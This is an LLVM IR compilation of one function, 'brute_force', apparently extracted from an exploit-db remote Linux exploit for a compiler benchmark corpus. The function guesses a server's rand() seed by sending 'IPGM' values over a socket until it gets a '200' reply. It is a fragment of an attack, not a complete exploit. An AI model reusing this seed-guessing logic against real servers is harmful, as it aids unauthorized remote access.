; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_58.c_brute_force.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_58.c_brute_force.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SIZ = common dso_local global i32 0, align 4
@SEED_START = common dso_local global i64 0, align 8
@seed = common dso_local global i64 0, align 8
@SEED_MAX = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [31 x i8] c"[-] Bruteforcing ... %d of %d\0D\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"IPGM %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"200\00", align 1
@.str.3 = private unnamed_addr constant [65 x i8] c"                                                               \0D\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @brute_force(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32, i32* @SIZ, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %4, align 8
  %12 = alloca i8, i64 %10, align 16
  store i64 %10, i64* %5, align 8
  store i32 0, i32* %6, align 4
  %13 = load i64, i64* @SEED_START, align 8
  store i64 %13, i64* @seed, align 8
  br label %14

14:                                               ; preds = %45, %1
  %15 = load i32, i32* %6, align 4
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %21, label %17

17:                                               ; preds = %14
  %18 = load i64, i64* @seed, align 8
  %19 = load i64, i64* @SEED_MAX, align 8
  %20 = icmp sle i64 %18, %19
  br label %21

21:                                               ; preds = %17, %14
  %22 = phi i1 [ false, %14 ], [ %20, %17 ]
  br i1 %22, label %23, label %48

23:                                               ; preds = %21
  %24 = load i64, i64* @seed, align 8
  %25 = load i64, i64* @SEED_MAX, align 8
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0), i64 %24, i64 %25)
  %27 = load i32, i32* @stdout, align 4
  %28 = call i32 @fflush(i32 %27)
  %29 = load i64, i64* @seed, align 8
  %30 = call i32 @srand(i64 %29)
  %31 = load i32, i32* %3, align 4
  %32 = call i32 (...) @rand()
  store i32 %32, i32* %7, align 4
  %33 = call i32 @my_send(i32 %31, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0), i32 %32)
  %34 = load i32, i32* @SIZ, align 4
  %35 = sub nsw i32 %34, 1
  %36 = call i32 @memset(i8* %12, i32 0, i32 %35)
  %37 = call i32 (...) @LOCAL_NET()
  %38 = load i32, i32* %3, align 4
  %39 = load i32, i32* @SIZ, align 4
  %40 = sub nsw i32 %39, 1
  %41 = call i32 @recv(i32 %38, i8* %12, i32 %40, i32 0)
  %42 = call i32 @strncmp(i8* %12, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i32 3)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %45, label %44

44:                                               ; preds = %23
  store i32 1, i32* %6, align 4
  br label %45

45:                                               ; preds = %44, %23
  %46 = load i64, i64* @seed, align 8
  %47 = add nsw i64 %46, 1
  store i64 %47, i64* @seed, align 8
  br label %14

48:                                               ; preds = %21
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.3, i64 0, i64 0))
  %50 = load i32, i32* %6, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %54

52:                                               ; preds = %48
  %53 = load i32, i32* %7, align 4
  store i32 %53, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %55

54:                                               ; preds = %48
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %55

55:                                               ; preds = %54, %52
  %56 = load i8*, i8** %4, align 8
  call void @llvm.stackrestore(i8* %56)
  %57 = load i32, i32* %2, align 4
  ret i32 %57
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @srand(i64) #2

declare dso_local i32 @my_send(i32, i8*, i32) #2

declare dso_local i32 @rand(...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @LOCAL_NET(...) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @strncmp(i8*, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
